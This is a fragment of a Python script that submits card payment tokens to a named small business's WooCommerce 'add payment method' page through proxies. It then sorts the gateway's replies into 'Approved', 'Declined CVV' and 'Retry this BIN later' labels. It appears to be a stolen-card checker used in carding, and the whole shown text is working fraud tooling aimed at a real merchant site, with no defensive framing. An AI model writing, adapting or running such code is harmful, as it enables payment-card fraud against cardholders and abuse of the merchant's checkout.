        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'master-card'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '1.50'),
        ('wc_braintree_credit_card_payment_nonce', tok),
        ('wc_braintree_device_data', '{"correlation_id":"a7bcabfc8a4750ff7382ece51cff3cc7"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{"correlation_id":"a7bcabfc8a4750ff7382ece51cff3cc7"}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '1.50'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', non),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
            cookies=r.cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
        text = response.text
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - final POST: {e}")
        return "ERROR: Proxy/Connection Failed"

    pattern = r'Status code (.*?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'added' in text or 'Payment method successfully added.' in text:
            result = "Charge 0.50$ ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'

    if 'risk_threshold' in result:
            return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
            return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in text:
            return 'Charge 0.50$ ✅'
    elif 'Duplicate card exists in the vault.' in result:
            return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
            return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
            return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
            return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
            return 'Approved ✅!'
    else:
        return result